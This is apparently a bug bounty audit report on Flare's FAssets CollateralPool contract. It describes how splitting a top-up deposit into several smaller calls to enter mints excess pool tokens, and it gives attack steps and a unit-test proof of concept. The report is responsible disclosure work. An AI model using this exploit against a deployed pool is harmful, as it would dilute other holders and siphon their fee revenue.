# #46949 \[SC-High] Top-up discount miscalculation allows minting excess pool tokens via repeated small deposits in \`CollateralPool::enter\`

**Submitted on Jun 6th 2025 at 15:50:32 UTC by @NHristov for** [**Audit Comp | Flare | FAssets**](https://immunefi.com/audit-competition/audit-comp-flare-fassets)

* **Report ID:** #46949
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/flare-foundation/fassets/blob/main/contracts/assetManager/implementation/CollateralPool.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

## Brief/Intro

The `_collateralToTokenShare` function in `CollateralPool.sol` applies a *top-up* bonus on the first chunk of collateral needed to reach the target pool-collateral ratio. However, because it recalculates that bonus slice against the current pool state on each call, an attacker can split a single top-up deposit into multiple smaller deposits and repeatedly capture the full bonus. This lets them mint more pool tokens than a single lump-sum deposit of the same total amount would allow.

## Vulnerability Details

In `CollateralPool` the function

```solidity
function _collateralToTokenShare(AssetData memory _assetData, uint256 _collateral)
    internal view returns (uint256)
{
    uint256 natRequiredToTopup = …
    uint256 collateralForTopupPricing = Math.min(_collateral, natRequiredToTopup);
    uint256 collateralAtTopupPrice = collateralForTopupPricing.mulDiv(
        SafePct.MAX_BIPS, topupTokenPriceFactorBIPS);
    uint256 tokenShareAtTopupPrice = poolConsideredEmpty
        ? collateralAtTopupPrice
        : _assetData.poolTokenSupply.mulDiv(collateralAtTopupPrice, _assetData.poolNatBalance);
    uint256 tokenShareAtStandardPrice = …
    return tokenShareAtTopupPrice + tokenShareAtStandardPrice;
}
```

Each call updates `CollateralPool::poolTokenSupply` and `CollateralPool::poolNatBalance` after minting, splitting a large deposit N into k equal chunks allows each chunk to benefit from bigger ratio between `CollateralPool::poolTokenSupply` and `CollateralPool::poolNatBalance` because the applied *topup* bonus will mint more pool tokens than the provided collateral.

1. Compute the full natRequiredToTopup for a large deposit C.
2. Split C into k equal chunks.
3. Call enter(..., { value: C/k }) k times.

## Impact Details

* An attacker can inflate their pool token balance without providing additional collateral, diluting all existing holders and siphoning future fee revenue. Depending on pool size and discount parameters, this can lead to severe economic loss and destabilize the pool.

## References

<https://github.com/flare-foundation/fassets/blob/fc727ee70a6d36a3d8dec81892d76d01bb22e7f1/contracts/assetManager/implementation/CollateralPool.sol#L485C1-L508C6>

## Proof of Concept

The following unit test demonstrates the exploit:

* To run the test paste the code in the `CollateralPool.ts` unit test file and execute it

```javascript
it("user can mint more pool tokens than expected by entering multiple times with smaller values than a single enter", async () => {
    // mint some f-assets so the pool can top up
    await fAsset.mint(accounts[2], ETH(1000), { from: assetManager.address });
    // calculate full‐topup deposit
    const natToTopup = await getNatRequiredToGetPoolCRAbove(topupCR);
    const collateral = maxBN(natToTopup, MIN_NAT_TO_ENTER);
    // split into 5 equal chunks
    const chunk = collateral.divn(5);
    // deposit 5 times, instead of once
    for (let i = 0; i < 5; i++) {
      await collateralPool.enter(0, true, { value: chunk });
    }
    const tokens = await collateralPoolToken.balanceOf(accounts[0]);
    const discountedTokens = applyTopupDiscount(natToTopup);
    const notDiscountedNat = collateral.sub(natToTopup);
    const notDiscountedTokens = notDiscountedNat.mul(discountedTokens).div(natToTopup);
    // attacker ends up with strictly more tokens than the genuine formula allows
    assert(tokens.gt(discountedTokens.add(notDiscountedTokens)),
           "tokens should be more than expected");
});
```
